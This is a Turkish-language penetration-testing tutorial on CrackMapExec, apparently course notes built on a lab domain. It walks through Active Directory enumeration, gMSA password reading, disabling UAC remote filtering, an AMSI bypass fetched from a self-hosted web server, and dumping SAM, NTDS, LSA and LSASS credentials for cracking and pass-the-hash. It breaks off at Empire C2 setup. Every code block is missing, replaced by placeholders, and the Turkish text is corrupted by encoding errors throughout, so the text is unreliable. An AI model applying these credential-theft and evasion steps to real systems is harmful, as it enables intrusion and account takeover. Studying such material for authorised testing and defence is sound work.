### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


